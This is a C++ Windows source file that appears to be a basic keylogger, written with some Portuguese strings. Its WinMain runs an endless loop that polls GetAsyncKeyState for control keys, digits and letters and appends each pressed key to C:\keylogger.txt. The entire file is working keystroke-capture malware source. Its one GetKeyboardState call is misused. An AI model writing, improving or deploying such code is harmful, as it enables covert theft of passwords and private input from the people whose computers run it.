#include <windows.h>
#include <fstream>

int APIENTRY WinMain(_In_ HINSTANCE hinstance, _In_opt_ HINSTANCE hprevinstance, _In_ LPSTR lpcmdline, _In_ int cmdshow) {
	std::ofstream arq;
	arq.open("C:\\keylogger.txt", std::ios::out | std::ios::app);

	for (;;) {
		if (GetKeyboardState((PBYTE)VK_CONTROL)) {
			Beep(400, 200);
		}
		if (GetAsyncKeyState(VK_CONTROL)) {
			arq << "CONTROL" << "\n";
		}
		if (GetAsyncKeyState(0x08)) {
			arq << "BACKSPACE" << "\n";
		}
		if (GetAsyncKeyState(0x09)) {
			arq << "TAB" << "\n";
		}
		if (GetAsyncKeyState(0x0C)) {
			arq << "Chave CLEAR" << "\n";
		}
		if (GetAsyncKeyState(0x0D)) {
			arq << "ENTER" << "\n";
		}
		if (GetAsyncKeyState(0x10)) {
			arq << "SHIFT" << "\n";
		}
		if (GetAsyncKeyState(0x12)) {
			arq << "ALT" << "\n";
		}
		if (GetAsyncKeyState(0x13)) {
			arq << "PAUSE" << "\n";
		}
		if (GetAsyncKeyState(0x14)) {
			arq << "CAPS LOCK " << " : ";
		}
		if (GetAsyncKeyState(0x30)) {
			arq << "0" << "\n";
		}
		if (GetAsyncKeyState(0x31)) {
			arq << "1" << "\n";
		}
		if (GetAsyncKeyState(0x32)) {
			arq << "2" << "\n";
		}
		if (GetAsyncKeyState(0x33)) {
			arq << "3" << "\n";
		}
		if (GetAsyncKeyState(0x34)) {
			arq << "4" << "\n";
		}
		if (GetAsyncKeyState(0x35)) {
			arq << "5" << "\n";
		}
		if (GetAsyncKeyState(0x36)) {
			arq << "6" << "\n";
		}
		if (GetAsyncKeyState(0x37)) {
			arq << "7" << "\n";
		}
		if (GetAsyncKeyState(0x38)) {
			arq << "8" << "\n";
		}
		if (GetAsyncKeyState(0x39)) {
			arq << "9" << "\n";
		}
		if (GetAsyncKeyState(0x41)) {
			arq << "A" << "\n";
		}
		if (GetAsyncKeyState(0x42)) {
			arq << "B" << "\n";
		}
		if (GetAsyncKeyState(0x43)) {
			arq << "C" << "\n";
		}
		if (GetAsyncKeyState(0x44)) {
			arq << "D" << "\n";
		}
		if (GetAsyncKeyState(0x45)) {
			arq << "E" << "\n";
		}
		if (GetAsyncKeyState(0x46)) {
			arq << "F" << "\n";
		}
		if (GetAsyncKeyState(0x47)) {
			arq << "G" << "\n";
		}
		if (GetAsyncKeyState(0x48)) {
			arq << "H" << "\n";
		}
		if (GetAsyncKeyState(0x49)) {
			arq << "I" << "\n";		
		}
		if (GetAsyncKeyState(0x4A)) {
			arq << "J" << "\n";
		}
		if (GetAsyncKeyState(0x4B)) {
			arq << "K" << "\n";
		}
		if (GetAsyncKeyState(0x4C)) {
			arq << "L" << "\n";
		}
		if (GetAsyncKeyState(0x4D)) {
			arq << "M" << "\n";
		}
		if (GetAsyncKeyState(0x4E)) {
			arq << "N" << "\n";
		}
		if (GetAsyncKeyState(0x4F)) {
			arq << "O" << "\n";
		}
		if (GetAsyncKeyState(0x50)) {
			arq << "P" << "\n";
		}
		if (GetAsyncKeyState(0x51)) {
			arq << "Q" << "\n";
		}
		if (GetAsyncKeyState(0x52)) {
			arq << "R" << "\n";
		}
		if (GetAsyncKeyState(0x53)) {
			arq << "S" << "\n";
		}
		if (GetAsyncKeyState(0x54)) {
			arq << "T" << "\n";
		}
		if (GetAsyncKeyState(0x55)) {
			arq << "U" << "\n";
		}
		if (GetAsyncKeyState(0x56)) {
			arq << "V" << "\n";
		}
		if (GetAsyncKeyState(0x57)) {
			arq << "W" << "\n";
		}
		if (GetAsyncKeyState(0x58)) {
			arq << "X" << "\n";
		}
		if (GetAsyncKeyState(0x59)) {
			arq << "Y" << "\n";
		}
		if (GetAsyncKeyState(0x5A)) {
			arq << "Z" << "\n";
		}
	}

	return 0;
}